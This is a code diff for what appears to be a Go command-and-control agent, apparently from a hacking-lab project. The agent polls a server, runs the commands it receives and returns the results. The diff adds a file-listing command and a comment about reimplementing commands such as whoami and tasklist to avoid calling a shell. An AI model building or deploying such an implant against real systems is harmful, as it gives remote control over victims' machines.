@@ -2,10 +2,11 @@ package main
 
 import (
 	"commons/commons/helpers"
-	commons "commons/commons/structures"
+	"commons/commons/structures"
 	"crypto/md5"
 	"encoding/gob"
 	"encoding/hex"
+	"io/ioutil"
 	"log"
 	"net"
 	"os"
@@ -13,7 +14,7 @@ import (
 )
 
 var (
-	message  commons.Message
+	message  structures.Message
 	waitTime = 5
 )
 
@@ -37,7 +38,8 @@ func main() {
 
 		// Send message to server
 		gob.NewEncoder(channel).Encode(message)
-
+		// Clean commands poool
+		message.Commands = []structures.Commands{}
 		// Receive server message
 		gob.NewDecoder(channel).Decode(&message)
 
@@ -46,8 +48,8 @@ func main() {
 				message.Commands[index].Response = executeCommand(command.Command)
 			}
 		}
-
 		time.Sleep(time.Duration(waitTime) * time.Second)
+
 	}
 
 }
@@ -61,7 +63,10 @@ func executeCommand(command string) (response string) {
 	baseCommand := separatedCommand[0]
 
 	switch baseCommand {
-	case "htb":
+	// ls,whoami,dir,tasklist
+	// reimplement the commands to avoid calling a shell
+	case "ls":
+		response = listFiles()
 		//
 	default:
 		//
@@ -69,7 +74,15 @@ func executeCommand(command string) (response string) {
 
 	return response
 }
-func messageContainsCommands(serverMessage commons.Message) (response bool) {
+
+func listFiles() (response string) {
+	files, _ := ioutil.ReadDir(message.AgentCWD)
+	for _, file := range files {
+		response += file.Name() + "\n"
+	}
+	return response
+}
+func messageContainsCommands(serverMessage structures.Message) (response bool) {
 	response = false
 	if len(serverMessage.Commands) > 0 {
 		response = true
